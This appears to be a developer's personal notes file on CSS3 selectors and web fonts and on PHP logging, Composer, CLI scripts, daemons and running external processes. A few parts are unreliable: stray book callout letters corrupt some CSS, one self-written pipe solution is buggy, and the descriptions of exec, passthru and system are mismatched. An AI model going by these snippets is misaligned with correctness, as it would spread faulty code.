E[attr^='value'] {...}

This code looks for the supplied value at the beginning of the specified
attribute.

To illustrate, consider the following example markup, showing a
list of three items, each of which contains a hyperlink with different (albeit
similar) values for the title attribute:

<li><a href="http://example.com/" title="Image Library">Example</a></li>
<li><a href="http://example.com/" title="Free Image Library">Example</a></li>
<li><a href="http://example.com/" title="Free Sound Library">Example</a></li>

I’ll apply this selector to the example markup:

a[title^='image'] {...}

In this case, the rule will be applied to the a element in the first list
item because the title attribute string begins with the word image. The rule
will not be applied to the a element in the second item, however, because,
although its title attribute contains that string, it doesn’t begin with it. Nor
will it be applied to the third string, as that string doesn’t match.

*** Ending Substring Attribute Value Selector

E[attr$='value'] {...}

a[title$='library'] {...}
This time the rule applies to all of the list items, as all of their title
attribute values end with the string library .

*** Arbitrary Substring Attribute Value Selector

This selector uses the asterisk ( * ) character. Here’s the new syntax:
E[attr*='value'] {...}

a[title*='image'] {...}
This rule is applied to the first and second list items because they both
contain the text string image in their title attributes, even though the string
appears in a different position in each example.

*** Multiple Attribute Selectors

You can also chain multiple selectors together, which allows you to be really
specific.
Imagine,
for example, that you had links to two files with identical names but that
were located in different folders:

<p><a href="http://example.com/folder1/file.pdf">Example</a></p>
<p><a href="http://example.com/folder2/file.pdf">Example</a></p>

If you want to specify a rule to apply to only the second p element, you
can chain some selectors together:

a[href^='http://'][href*='/folder2/'][href$='.pdf'] {...}

This code looks for a elements that have an href attribute beginning
with http:// , ending with .pdf , and with /folder2/ contained within it. That’s
specific!

*** The General Sibling Combinator
Our final new DOM selector in CSS3 is a combinator, which you’ll recall
means that it joins together more than one selector. The General Sibling
Combinator is an extension of the Adjacent Sibling Combinator, which was
introduced in CSS2. The syntaxes differ by just a single character:
#+begin_src css
E + F {...} /* Adjacent Sibling Combinator */
E ~ F {...} /* General Sibling Combinator */
#+end_src 

The difference between the two is subtle but important: Adjacent
Sibling selects any element ( F ) that is immediately preceded by element
( E ) on the same level of the document tree, but General Sibling selects any
element ( F ) that is preceded by element ( E ) on the same level of the tree,
regardless of whether it is immediately adjacent.

*** Structural Pseudo-classes

As I stated in the introduction to this chapter, a pseudo-class provides a way
to select an element based on information that is not specified in the docu-
ment tree.

Take, for example, the following markup:

<div>
<p>Lorem ipsum.</p>
<p>Dolor sit amet.</p>
</div>

The first of the two p elements is the first child of the div element. That’s
obvious from the document tree, but the document tree doesn’t provide any
information that would allow you to apply a rule only to that element. CSS2
introduced the :first-child pseudo-class for exactly that reason:

E:first-child {...}

*** The :nth-* Pseudo-classes

The basic syntax of the :nth-* pseudo-classes is quite straightforward.
By default, n represents a number that begins at 0 and increments by 1 (1, 2,
3, etc.). Another integer can be passed into it as a multiplier. For example,
2n is every multiple of 2 (2, 4, 6, etc.), 3n is every multiple of 3 (3, 6, 9, etc.),
and so on:

E:nth-*(n) {...}
E:nth-*(2n) {...}
E:nth-*(3n) {...}

You may also use the mathematical operators for plus (+) and minus (−).
So 2n+1 selects every multiple of two plus one (1, 3, 5, etc.), and 3n-1 selects
every multiple of three minus one (2, 5, 8, etc.):

E:nth-*(n+1) {...}
E:nth-*(2n+1) {...}
E:nth-*(3n-1) {...}

Two special keyword values, even and odd , are also available; you can use
these to replace 2n and 2n+1 , respectively:

E:nth-*(even) {...}
E:nth-*(odd) {...}

*** :nth-child() and :nth-of-type()
    
The simplest examples of these pseudo-classes are :nth-child()
and  :nth-of-type() . The first, :nth-child() , selects an element based on its
position in a count of the total number of children in its parent element;
:nth-of-type() bases its count not on the total children, but only on those
of the specified element type.

E:nth-child(n) {...}
E:nth-of-type(n) {...}
E:nth-child(2n) {...}
E:nth-of-type(2n) {...}


In this example, rules u and v are equivalent because the count value
( n ) is left at the default; both of these simply select all child elements of type
E . The difference reveals itself in the later examples: in w, :nth-child(2n)
selects all elements of type E from a count that includes all its siblings
but only where those elements are even-numbered. In x, by comparison,
:nth-of-type(2n) selects all even-numbered elements of type E from a count
that includes only those elements.

.table td{
    border: red solid 1px !important;
}

.table th{
    border: red solid 1px !important;
}

*** :nth-last-child() and :nth-last-of-type()
The :nth-last-child() and :nth-last-of-type() pseudo-classes accept the
same arguments as :nth-child() and :nth-of-type() , except they are counted
from the last element, working in reverse.
*** :first-of-type, :last-child, and :last-of-type
As you’re no doubt aware, the :first-child pseudo-class is a selector
used to apply rules to an element that is the first child of its parent. As
with  :nth-of-type() , however, :first-of-type is more specific, applying only
to the element that is the first child of the named type of its parent. A pair
of counterpart pseudo-classes is also available, :last-child and :last-of-type ,
which—as you might have guessed—select the last child element or the last
child element of that type, respectively, of the parent.
*** :only-child and :only-of-type
These two pseudo-classes are used to select elements in the document tree
that have a parent but either no sibling elements ( :only-child ) or no siblings
of the same type ( :only-of-type ).

*** :target
For example, if you had this markup in a page:
<h4 id="my_id">Lorem ipsum</h4>
you could refer to it with this link:
<a href="page.html#my_id">Lorem</a>
The :target pseudo-class allows you to apply styles to the element when
the referring URI has been followed. In this example, if you want to apply
styles to the h4 element when the URI is followed, you use:
#my_id:target {...}

*** :empty
The :empty pseudo-class selects an element that has no children, including
text nodes.
html {...} /* Specificity: 1; */
html:root {...} /* Specificity: 2; */

*** :root
The :root pseudo-class selects the first element in a document tree
Let’s say you’re creating a base style sheet and want to set a property on
the html element, which shouldn’t be altered. In this case, you would use
something like this:

html:root { background-color: black; }

The higher specificity gives precedence to this rule over any other rules
applied to the html element, meaning the following is ignored:

html { background-color: white; }

*** :not()
The negation pseudo-class :not() selects all elements except those that are
given as the value of an argument:
E :not(F) {...}
This rule selects all children of element E except for those of type F . For
example, to color all the immediate child elements of a div , except for p ele-
ments, you use this:
div > :not(p) { color: red; }

*** UI Element States
CSS3 has three UI state pseudo-class selectors, which allow you to apply
rules to elements based on their current state:
:checked {...}
:disabled {...}
:enabled {...}

input[type='text']:disabled { border: 1px dotted gray; }
input[type='text']:enabled { border: 1px solid black; }

*** Constraint Validation Pseudo-classes
HTML5 introduced a new API for client-side validation of forms, known
as the constraint validation API, which can be used to determine if certain
requirements are met before the form contents are sent to the server.
You can style elements depending on whether they’re required or
optional by using their namesake pseudo-classes:

:required {...}
:optional {...}

Each form field can be in one of two states of validation: either valid or
invalid. If no specific constraints are applied, either by the browser or the
author, a form field is valid by default. As before, each state has a namesake
pseudo-class:

:valid {...}
:invalid {...}

Finally, some HTML5 elements can have a permitted range of values,
set by using the min and max attributes.

:in-range {...}
:out-of-range {...}

*** Pseudo-elements

Like pseudo-classes, pseudo-elements provide information that is not speci-
fied in the document tree. But where pseudo-classes use “phantom” condi-
tions such as an element’s position in the tree or its state, pseudo-elements
go further and allow you to apply styles to elements that don’t exist in the
tree at all.

In CSS2, the four pseudo-elements are :first-line and :first-letter ,
which select subelements in text nodes, and :after and :before , which allow
you to apply styles at the beginning and end of existing elements. CSS3
doesn’t introduce any new pseudo-elements, but it refines the definitions
slightly and introduces a new syntax to differentiate them from pseudo-
classes. In CSS3, pseudo-elements are prefixed with a double colon ( :: ),
like so:

::first-line {...}
::first-letter {...}
::after {...}
::before {...}

*** The ::selection Pseudo-element

::selection is used to apply rules to an element that the user has
selected in the browser (for example, a portion of a text node):
::selection {...}

Only a limited number of properties can be applied with ::­selection :
color , background-color , and the background shorthand (although not
background-image ). Using ::selection , you can do something like this:

p::selection {
background-color: black;
color: white;
}

** web fonts
*** The @font-face Rule
To display web fonts on your pages, you first need to define them by using
the @font-face rule.

@font-face {
font-family: FontName;
src: local('fontname'), xurl('/path/filename.otf') yformat('opentype');
}

To use the font I just defined, I need only call its name in the font stack,
as I’d normally do:
E { font-family: FontName; }

*** Defining Different Faces
If you want to use a different face, such as a
bolder weight or an italic type, you have to define each font face individu-
ally. To do this, you re-use the same name and add extra descriptors to the
@font-face rule:

@font-face {
font-family: 'Gentium Basic';
src: url('vGenBasR.woff') format('woff');
}
@font-face {
font-family: 'Gentium Basic';
font-style: italic;
src: url('yGenBasI.woff') format('woff');
}
h1 { font-family: 'Gentium Basic', sans-serif; }

*** The Final “Bulletproof” Syntax
For your chosen font to display the same in every browser on every plat-
form, you should use code in this format:
@font-face {
font-family: 'Gentium Basic';
src: url('GenBkBasR.eot');
src: url('GenBasR.eot?#iefix') format('embedded-opentype'),
url('GenBkBasR.woff') format('woff'),
url('GenBkBasR.ttf') format('truetype');
}

*** todo: continue text effects@ch6 the book of css3
** make text unselectable

#+begin_src 
.unselectable{
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  -o-user-select: none;
  user-select: none;
}
#+end_src

using javascript
#+begin_src javascript
<div id="test" onmousedown='return false;' onselectstart='return false;'>
#+end_src

** useful resources

https://www.w3.org/TR/css3-selectors/

http://www.w3.org/TR/css3-fonts/

https://css-tricks.com/

* monolog helper functions
#+begin_src php
$logger = new \Monolog\Logger('xbs-res');
//$logger->pushHandler(new \Monolog\Handler\StreamHandler(__DIR__.'/tmp/app.log',Logger::DEBUG));
$logger->pushHandler(new \Monolog\Handler\BrowserConsoleHandler(), Logger::DEBUG);
$logger->pushHandler(new \Monolog\Handler\RotatingFileHandler(__DIR__.'/tmp/app',Logger::DEBUG));

function dlog($message)
{
    global $logger;
    global $logIP;
    if(isset($logger)) {
        if( !isset($logIP)) {
            $logger->debug($message);
        }else if ($logIP == $_SERVER['REMOTE_ADDR'])
        {
                $logger->debug("iplog is set");
                $logger->debug($message);
        }
    }
}
function ilog($message)
{
    global $logger;
    global $logIP;
    if(isset($logger)) {
        if( !isset($logIP)) {
            $logger->info($message);
        }else if ($logIP == $_SERVER['REMOTE_ADDR'])
        {
            $logger->info("iplog is set");
            $logger->info($message);
        }
    }
}
function wlog($message)
{
    global $logger;
    global $logIP;
    if(isset($logger)) {
        if( !isset($logIP)) {
            $logger->warn($message);
        }else if ($logIP == $_SERVER['REMOTE_ADDR'])
        {
            $logger->warn("iplog is set");
            $logger->warn($message);
        }
    }
}
#+end_src 

* composer
** update only one vendor
#+begin_src shell
$ composer update foo/bar
#+end_src 

** update ~composer.lock~ file has
#+begin_src shell
$ composer update --lock
#+end_src 

** Add a library without editing your composer.json

#+begin_src shell
$ composer require "foo/bar:1.0.0"
# quickly start a new project.
$ composer init --require="foo/bar:1.0.0" -n
$ cat composer.json
{
    "require": {
        "foo/bar": "1.0.0"
    }
}
#+end_src 

If you omit to specify the version Composer will fetch the last stable.

** be ready for production
ust a reminder, before deploying your code in production, don't forget to
optimize the autoloader:

#+begin_src shell 
$ composer dump-autoload --optimize 
#+end_src 

This can also be used while installing
packages with the --optimize-autoloader option. Without that optimization, you
may notice a performance loss from 20 to 25%.

** Autoloading
basic autoload example
#+begin_src php
require __DIR__ . '/vendor/autoload.php';

$log = new Monolog\Logger('name');
$log->pushHandler(new Monolog\Handler\StreamHandler('app.log', Monolog\Logger::WARNING));
$log->addWarning('Foo');
#+end_src 

* problems
** Functions Pipeline
*** statement
The task: build a function pipe() that takes any number of callables as arguments and returns a new callable.
The returned callable passes any arguments to the first callable, then the result of that to the next callable, and so on, and will return the final result.
So the processing order is left to right.
Example:

#+begin_src php 
// first apply strtolower(), then apply ucwords second.
$f = pipe('strtolower', 'ucwords');
$f('FOO BAR') === ucwords(strtolower('FOO BAR'));
#+end_src 

*** my solution
#+begin_src php 

function pipe(...$params){
    return function($input) use($params){
        foreach($params as $p){
            $input = call_user_func($p,$input);
        }
        return $input;
    };
}
$f = pipe('strtolower','ucwords','strtolower','strtoupper');
echo $f('FOO BAR');

#+end_src 

*** my solution #2
     
#+begin_src php
function pipe(){
    // get all function arguments
    $numArgs = func_num_args();
    if($numArgs < 2){
        throw InvalidArgumentException('pipe takes 2 or more arguments');
    }
    // assume first argument is the input
    $input = func_get_arg(0);
    // loop in all functions
    $ret = $input;
    for($i=1; $i < $numArgs; $i++){
        $ret = func_get_arg($i)($input);
    }
    //return the results
    return $ret;
}

$f = pipe("test",'strtoupper','strtolower','ucwords');
echo $f;
#+end_src

* tail with php
** #1
#+begin_src php
<?php
// full path to text file
define("TEXT_FILE", "/home/www/default-error.log");
// number of lines to read from the end of file
define("LINES_COUNT", 10);
 
 
function read_file($file, $lines) {
    //global $fsize;
    $handle = fopen($file, "r");
    $linecounter = $lines;
    $pos = -2;
    $beginning = false;
    $text = array();
    while ($linecounter > 0) {
        $t = " ";
        while ($t != "\n") {
            if(fseek($handle, $pos, SEEK_END) == -1) {
                $beginning = true; 
                break; 
            }
            $t = fgetc($handle);
            $pos --;
        }
        $linecounter --;
        if ($beginning) {
            rewind($handle);
        }
        $text[$lines-$linecounter-1] = fgets($handle);
        if ($beginning) break;
    }
    fclose ($handle);
    return array_reverse($text);
}
 
$fsize = round(filesize(TEXT_FILE)/1024/1024,2);
 
echo "<strong>".TEXT_FILE."</strong>\n\n";
echo "File size is {$fsize} megabytes\n\n";
echo "Last ".LINES_COUNT." lines of the file:\n\n";
 
$lines = read_file(TEXT_FILE, LINES_COUNT);
foreach ($lines as $line) {
    echo $line;
}
?>
#+end_src

** #2
#+begin_src php
<?php

	$tests = array(
		'1K'   => 'logs/test.1K.log',
		'10K'  => 'logs/test.10K.log',
		'100K' => 'logs/test.100K.log',
		'1M'   => 'logs/test.1M.log',
		'10M'  => 'logs/test.10M.log',
		'100M' => 'logs/test.100M.log'
	);

	function tailCustom($filepath, $lines = 1, $adaptive = true) {

		// Open file
		$f = @fopen($filepath, "rb");
		if ($f === false) return false;

		// Sets buffer size
		if (!$adaptive) $buffer = 4096;
		else $buffer = ($lines < 2 ? 64 : ($lines < 10 ? 512 : 4096));

		// Jump to last character
		fseek($f, -1, SEEK_END);

		// Read it and adjust line number if necessary
		// (Otherwise the result would be wrong if file doesn't end with a blank line)
		if (fread($f, 1) != "\n") $lines -= 1;
		
		// Start reading
		$output = '';
		$chunk = '';

		// While we would like more
		while (ftell($f) > 0 && $lines >= 0) {

			// Figure out how far back we should jump
			$seek = min(ftell($f), $buffer);

			// Do the jump (backwards, relative to where we are)
			fseek($f, -$seek, SEEK_CUR);

			// Read a chunk and prepend it to our output
			$output = ($chunk = fread($f, $seek)) . $output;

			// Jump back to where we started reading
			fseek($f, -mb_strlen($chunk, '8bit'), SEEK_CUR);

			// Decrease our line counter
			$lines -= substr_count($chunk, "\n");

		}

		// While we have too many lines
		// (Because of buffer size we might have read too many)
		while ($lines++ < 0) {

			// Find first newline and remove all text before that
			$output = substr($output, strpos($output, "\n") + 1);

		}

		// Close file and return
		fclose($f);
		return trim($output);

	}

	function tailSingleByte($file, $lines = 1) {
		$handle = fopen($file, "r");
		$linecounter = $lines;
		$pos = -2;
		$beginning = false;
		$text = array();
		while ($linecounter > 0) {
			$t = " ";
			while ($t != "\n") {
				if (fseek($handle, $pos, SEEK_END) == -1) {
					$beginning = true; 
					break; 
				}
				$t = fgetc($handle);
				$pos --;
			}
			$linecounter --;
			if ($beginning) rewind($handle);
			$text[$lines-$linecounter-1] = fgets($handle);
			if ($beginning) break;
		}
		fclose ($handle);
		return trim(implode("", array_reverse($text))); // array_reverse is optional: you can also just return the $text array which consists of the file's lines.
	}

	function tailFile($filepath, $lines = 1) {
		return trim(implode("", array_slice(file($filepath), -$lines)));
	}

	function tailShell($filepath, $lines = 1) {
		ob_start();
		passthru('tail -'  . $lines . ' ' . escapeshellarg($filepath));
		return trim(ob_get_clean());
	}

	function display($string) {
		echo nl2br(str_replace("\n", "#N\n", $string));
	}

	function measureStart() {
		return microtime(true);
	}

	function measureEnd($m) {
		return number_format(microtime(true) - $m, 10);
	}

	foreach ($tests as $k => $test) {
		$l = 1;
		while ($l <= 1000) {

			for ($j = 0; $j < 10; $j++) {

				$m = measureStart();
				tailCustom($test, $l);
				$m = measureEnd($m);
				echo implode(',', array('custom', $k, $l, $m)) . "\n";

				$m = measureStart();
				tailCustom($test, $l, false);
				$m = measureEnd($m);
				echo implode(',', array('customfb', $k, $l, $m)) . "\n";
				
				$m = measureStart();
				tailSingleByte($test, $l);
				$m = measureEnd($m);
				echo implode(',', array('singlebyte', $k, $l, $m)) . "\n";
				
				if ($k != '100M') {
					$m = measureStart();
					tailFile($test, $l);
					$m = measureEnd($m);
					echo implode(',', array('file', $k, $l, $m)) . "\n";
				}

				$m = measureStart();
				tailShell($test, $l);
				$m = measureEnd($m);
				echo implode(',', array('shell', $k, $l, $m)) . "\n";

			}

			if ($l >= 100) $l += 100;
			elseif ($l >= 10) $l += 10;
			else $l++;

		}
	}

?>
#+end_src

** sources
http://tekkie.flashbit.net/php/tail-functionality-in-php
https://gist.github.com/beekalam/ff1f6e930deb9f00e0fbc98cd8387f90
http://code.google.com/p/php-tail/
https://gist.github.com/lorenzos/1711e81a9162320fde20
http://stackoverflow.com/questions/15025875/what-is-the-best-way-in-php-to-read-last-lines-from-a-file
http://www.geekality.net/2011/05/28/php-tail-tackling-large-files/
* CLI
** script arguments
#+begin_src php
<?php
echo "numbe of arguments" . $argc . "\n";
echo "list of argumetns: " . print_r($argv) . "\n";

#+end_src

** The Many Ways to Call PHP Scripts
#+begin_src php
//From a File
//You can tell PHP to execute a particular PHP source code file. Here’s an example:
~$ php myscript.php
~$ php -f myscript.php

//Note that -f is optional; the previous two lines are functionally equivalent. The PHP command-line
//options detailed earlier, where appropriate, work in this method. This example
~$ php -e myscript.php
//will execute the file myscript.php in Extended Information Mode.

//From a String
//You can execute a single line of code with the -r flag, as shown here:
 ~$ php -r "echo(\"Hello World!\n\");"

//From STDIN
//If you do not specify a file or use the -r option, PHP will treat the contents of STDIN as the PHP code to be
//executed, as shown here (note that echo works like this only on Linux or macOS):
~$ echo '<?php echo "hello\n";?>' | php
//You can also use this method with -B, -R, -F, and -E to make PHP a first-class citizen in shell
//scripting, giving you the ability to pipe data in and out of PHP. For instance, to reverse every line of a file (or
//any data source that you pipe into it), on Linux or macOS use the following:

~$ cat file.txt | php -R 'echo strrev($argn)."\n";' | grep olleh

//If you want to use options such as -R but have too much PHP code to fit comfortably on the command line,
//you can put the code in a normal PHP source code file and include it with include(). Here’s an example:

~$ cat something.txt > php -R 'include("complicated.php");'

//If you have a nontrivial PHP script, it may be more efficient to package it into functions and include it
//once with -B (-B means it’s executed before the main code) and then execute the function each time with
//-R. The following example loads the content of my_functions.php once at the start, and then the function
//complicated() from that file is called on each line (each $argn) from the data file (data.txt):

~$ php -B 'include("my_functions.php");' -R 'complicated($argn);' -f 'data.txt'
#+end_src

** As a Self-Executing Script
*** unix/linux
#+begin_src php
#!/usr/bin/php
<?php

//~$ chmod a+x myscript.php
// use env
#!/usr/bin/env php
#+end_src

*** windows
To do this, run the following two commands at the Windows command prompt,
which you should run as Administrator. Make sure to change the path/file name in the second command to
match your installation.

assoc .php=phpfile
ftype phpfile="C:\PHP5\php.exe" -f "%1" -- %~2

These changes allow you to run myscript rather than C:\php\php.exe myscript.php.
*** clickable icons linux
On most Linux systems, specifically those that support the freedesktop.org Desktop Entry Specification
standard, you can create a clickable launcher icon by simply creating a text file. Most mainstream Linux
distributions and their window managers follow at least the basics of this standard. To create a launcher for
your app, create a text file in the folder where you want it to appear (for example, in /home/rob/Desktop)
called, for instance, myscript.desktop. It is important that it has the .desktop extension. In the file, add the
#+begin_src 
following lines:
[Desktop Entry]
Type=Application
Name=My Funky App
Terminal=true
Exec=/usr/bin/php /home/rob/scripts/myscript.php
Icon=/usr/share/icons/Humanity/emblems/32/emblem-OK.png
#+end_src
*** Clickable Icons: Ubuntu Unity
you create a .desktop file in a similar manner to the Linux
launcher you created before, but with a few more entries in the file. So let’s create a new myscript.desktop:
#+begin_src 
[Desktop Entry]
Name=My Super Script
Exec=/usr/bin/php /home/rob/scripts/myscript.php
Icon=/usr/share/icons/Humanity/emblems/32/emblem-important.svg
Terminal=true
Type=Application
StartupNotify=true
Actions=Window;
[Desktop Action Window]
Name=Open me a new window please
Exec=/usr/bin/php /home/me/scripts/myscript.php -n
OnlyShowIn=Unity;
#+end_src

** Quitting your script
   
•	 0: Success. You’ve exited normally.
•	 1: General error. This is usually used for application- or language-specific errors and
syntax errors.
•	 2: Incorrect usage.
•	 126: Command is not executable. This is usually permissions related.
•	 127: Command is not found.
•	 128+N (up to 165): Command terminated by POSIX signal number N. For example,
in the case of kill -9 myscript.php, it should return code 137 (which is 128+9).
•	 130: Command terminated by Ctrl+C (Ctrl+C is POSIX code 2, so, using the previous
example, 128 + 2 = 130).
•	 Any other positive integer is generally construed as exiting because of an unspecified
error.
** preload a php file using auto_prepend_file
#+begin_src shell
$ php -d auto_prepend_file=initialize.php -a
Interactive mode enabled
#+end_src

If you regularly use a few different initialization
files like this, you can create shell aliases to commands by using the -d flag. For instance, you could add lines
similar to the following to your ~/.bash_profile:

#+begin_src shell 
alias php-clients="php -d auto_prepend_file=clientSetup.php -a"
alias php-inhouse="php -d auto_prepend_file=ourSiteSetup.php -a"
#+end_src

* Daemons
The outline process for creating a daemon is as follows:
 1 Run a process (PHP script). We call this the parent process.
 2 From the parent, fork (copy) a child process.
 3 The parent process then exits. The child process is now parentless.
 4 init adopts the parentless child process. init is the original process
   started by the kernel when it boots and is the ancestor of all processes.
 5 Dissociate (detach the child) from the terminal you started the parent in. This is so that
  - None of your output appears in the terminal
  - Killing the terminal won’t kill your child process
  - The process is truly running in the background
 6 To dissociate (detach), you need to do the following:
  - Move the child process into its own POSIX process session.
  - Fork it once again (into the grandchild process) and kill the child process.
  - Close any file descriptors such as STDIN that may tie it to the terminal.
#+begin_src php
<?php

# We start by forking this script, which creates the child process.

$pid = pcntl_fork();

# The child process will start running from here and will be a copy of the
# parent process, which includes all opened resources, variable values and
# so on, with the sole exception of the $pid variable above which is not
# set for the child. The parent process will keep running from here as
# well, with the process ID of the child process assigned to $pid

# If for some reason a child process could not be forked, for example
# the system is low on memory, $pid will be set to -1

if ($pid == -1) { exit("Could not fork the child process"); };

# If $pid is set to a process ID, then we must be the parent, and
# should exit.

if ($pid) { exit(0); };

# As the parent has exited above, the following code is now executed
# solely by the child process.

# We detach from the TTY (terminal) by becoming the "session leader"
# (instead of the TTY being leader. This starts a new POSIX session) ...

if ( posix_setsid()  === -1 ) {
  exit("Could not become the session leader");
};

# ... and then by forking again, to create a grandchild process

$pid = pcntl_fork();

if ($pid == -1) { exit("Could not fork child process into grandchild"); };

# Exit the child process, leaving only the grandchild beyond this point.

if ($pid) { exit(0); };

# Now to finally dissociate from the TTY and run in the background, we
# need to close our input and output streams to it. These are
# automatically defined and opened in the CLI SAPI, so will always need to
# be closed.

if (!fclose(STDIN)) { exit('Could not close STDIN'); };
if (!fclose(STDERR)) { exit('Could not close STDERR'); };
if (!fclose(STDOUT)) { exit('Could not close STDOUT'); };

# STDOUT is now closed, if you echo or print anything or interpolate HTML
# after this point, your script would crash. Likewise, any error messages
# would have nowhere to go, and any inadvertent attempts to read input
# would end badly. So instead we will recreate these three streams, but
# with sensible destinations. When we fclose the standard streams, and
# because you cannot redefine a constant, PHP simply assigns the standard
# streams to the next three new file descriptors opened (whatever they
# are called and whereever they point to). Thus the following also acts
# to protect any other streams you may open from "pollution" caused by
# accidental writes to those standard streams

$STDIN = fopen('/dev/null', 'r');
$STDOUT = fopen('/dev/null', 'w');
$STDERR = fopen('/var/log/our_error.log', 'wb');

# We are now a free-floating daemon, fully detached from our TTY!

# Now we go into our main loop, and do something useful.

# We set a variable which will allow us to escape from the loop if we
# want to shut down our daemon.

$stayInLoop = true;

while ($stayInLoop) {

    # do useful stuff here, like listening for connections,
    # monitoring things, or whatever else your daemon does.

    # When it's time to exit, set $stayInLoop = false at some point in the
    # loop and this loop will be the last. If you need to exit before the
    # loop finishes you will need to call break and do any necessary
    # tidying up. Here, we will end if it's a Tuesday, looping only once.

    // if (date('l') == 'Tuesday') { $stayInLoop = false; };
    if (( date('m') + 0) % 10 == 0) { $stayInLoop = false; };

    # For this example, we're going to execute a cli program called
    # notify-send to periodically pop up a notification to say hello,
    # which we looked at in Chapter 4.

    `notify-send 'Hello, The daemon is alive!'`;

    # The following line adds a "sleep" to each cycle of the loop. If we
    # didn't do this, our daemon would (try to) consume 100% of the CPU
    # time as it constantly cycles and evaluates the conditions for
    # looping. You can adjust the time it sleeps for depending on the
    # "responsiveness" required of your daemon. Giving it a break for even
    # a few 100 or 1000 milliseconds (using usleep) helps to maintain
    # overall system responsiveness.

    sleep(15); # Loop every 15 seconds
};

# We've exited our loop, so do any clean-up required here

`notify-send 'The Daemon is now finished. Bye Bye.!'`;

# And then exit

exit(0);

#+end_src

* Starting External Processes from PHP, or Shelling Out
** intro
Before your script can start talking to another process, that other process has to start running. You can
manually start another piece of software at the same time as your PHP script, but often it is useful for the
PHP script itself to start the other software when it needs to. This is often referred to as shelling out.
Numerous functions are available in PHP to achieve this, each doing it in a slightly different way:
•	 exec(): Executes a program and sends the text output to the user.
•	 passthru(): Executes a program and sends the binary output to the user.
•	 system(): Executes a program and gathers the output for use by PHP.
•	 shell_exec(): Executes a command via a shell and gathers its output for use by PHP.
•	 Backtick operator (for example, `command`): identical to shell_exec().
•	 pcntl_exe(): Executes a program in the current process space (that is, it stops the
current PHP script and replaces it with the specified program).
•	 popen(): Executes a program and opens a file pointer (identical to the pointers
returned by fopen(), for example) to read or write to the process via STDOUT or STDIN.
Can only read or write, not both.
•	 proc_open(): Like popen(), but with more control. Allows both reading and writing
at the same time. Not as simple to use as popen().

** Gathering Output from a Program

#+begin_src php 
// Run a command and return its results as a string.
$output_string = shell_exec('program args');

// Same as above, using backtick operator.
$output_string = `program args`;

// Run a command and return its results as a list of strings,
// one per line.
$output_lines = array();
exec('program args', $output_lines);

// -----------------------------

// The only way to execute a program without using the shell is to
// use pcntl_exec(). However, there is no way to do redirection, so
// you can't capture its output.

$pid = pcntl_fork();
if ($pid == -1) {
    die('cannot fork');
} elseif ($pid) {
    pcntl_waitpid($pid, $status);
} else {
    // Note that pcntl_exec() automatically prepends the program name
    // to the array of arguments; the program name cannot be spoofed.
    pcntl_exec($program, array($arg1, $arg2));
}
#+end_src 

** Running Another Program
   
#+begin_src php 
// Run a simple command and retrieve its result code.
exec("vi $myfile", $output, $result_code);

// -----------------------------

// Use the shell to perform redirection.
exec('cmd1 args | cmd2 | cmd3 >outfile');
exec('cmd args <infile >outfile 2>errfile');

// -----------------------------

// Run a command, handling its result code or signal.
$pid = pcntl_fork();
if ($pid == -1) {
    die('cannot fork');
} elseif ($pid) {
    pcntl_waitpid($pid, $status);
    if (pcntl_wifexited($status)) {
        $status = pcntl_wexitstatus($status);
        echo "program exited with status $status\n";
    } elseif (pcntl_wifsignaled($status)) {
        $signal = pcntl_wtermsig($status);
        echo "program killed by signal $signal\n";
    } elseif (pcntl_wifstopped($status)) {
        $signal = pcntl_wstopsig($status);
        echo "program stopped by signal $signal\n";
    }
} else {
    pcntl_exec($program, $args);
}

// -----------------------------

// Run a command while blocking interrupt signals.
$pid = pcntl_fork();
if ($pid == -1) {
    die('cannot fork');
} elseif ($pid) {
    // parent catches INT and berates user
    declare(ticks = 1);
    function handle_sigint($signal) {
        echo "Tsk tsk, no process interruptus\n";
    }
    pcntl_signal(SIGINT, 'handle_sigint');
    while (!pcntl_waitpid($pid, $status, WNOHANG)) {}
} else {
    // child ignores INT and does its thing
    pcntl_signal(SIGINT, SIG_IGN);
    pcntl_exec('/bin/sleep', array('10'));
}

// -----------------------------

// Since there is no direct access to execv() and friends, and
// pcntl_exec() won't let us supply an alternate program name
// in the argument list, there is no way to run a command with
// a different name in the process table.
#+end_src 

** Replacing the Current Program with a Different One
#+begin_src php 
// Transfer control to the shell to run another program.
pcntl_exec('/bin/sh', array('-c', 'archive *.data'));
// Transfer control directly to another program.
pcntl_exec('/path/to/archive', array('accounting.data'));
#+end_src

** Reading or Writing to Another Program
#+begin_src php 
// Handle each line in the output of a process.
$readme = popen('program arguments', 'r');
while (!feof($readme)) {
    $line = fgets($readme);
    if ($line === false) break;
    // ...
}
pclose($readme);

// -----------------------------

// Write to the input of a process.
$writeme = popen('program arguments', 'w');
fwrite($writeme, 'data');
pclose($writeme);

// -----------------------------

// Wait for a process to complete.
$f = popen('sleep 1000000', 'r');  // child goes to sleep
pclose($f);                        // and parent goes to lala land

// -----------------------------

$writeme = popen('program arguments', 'w');
fwrite($writeme, "hello\n");  // program will get hello\n on STDIN
pclose($writeme);             // program will get EOF on STDIN

// -----------------------------

// Output buffering callback that sends output to the pager.
function ob_pager($output, $mode) {
    static $pipe;
    if ($mode & PHP_OUTPUT_HANDLER_START) {
        $pager = getenv('PAGER');
        if (!$pager) $pager = '/usr/bin/less';  // XXX: might not exist
        $pipe = popen($pager, 'w');
    }
    fwrite($pipe, $output);
    if ($mode & PHP_OUTPUT_HANDLER_END) {
        pclose($pipe);
    }
}

// Redirect standard output to the pager.
ob_start('ob_pager');

// Do something useful that writes to standard output, then
// close the output buffer.
// ...
ob_end_flush();
#+end_src 

** Filtering Your Own Output
#+begin_src php
// Output buffering: Only display a certain number of lines of output.
class Head {
    function Head($lines=20) {
        $this->lines = $lines;
    }

    function filter($output, $mode) {
        $result = array();
        $newline = '';
        if (strlen($output) > 0 && $output[strlen($output) - 1] == "\n") {
            $newline = "\n";
            $output = substr($output, 0, -1);
        }
        foreach (explode("\n", $output) as $i => $line) {
            if ($this->lines > 0) {
                $this->lines--;
                $result[] = $line;
            }
        }
        return $result ? implode("\n", $result) . $newline : '';
    }
}

// Output buffering: Prepend line numbers to each line of output.
class Number {
    function Number() {
        $this->line_number = 0;
    }

    function filter($output, $mode) {
        $result = array();
        $newline = '';
        if (strlen($output) > 0 && $output[strlen($output) - 1] == "\n") {
            $newline = "\n";
            $output = substr($output, 0, -1);
        }
        foreach (explode("\n", $output) as $i => $line) {
            $this->line_number++;
            $result[] = $this->line_number . ': ' . $line;
        }
        return implode("\n", $result) . $newline;
    }
}

// Output buffering: Prepend "> " to each line of output.
class Quote {
    function Quote() {
    }

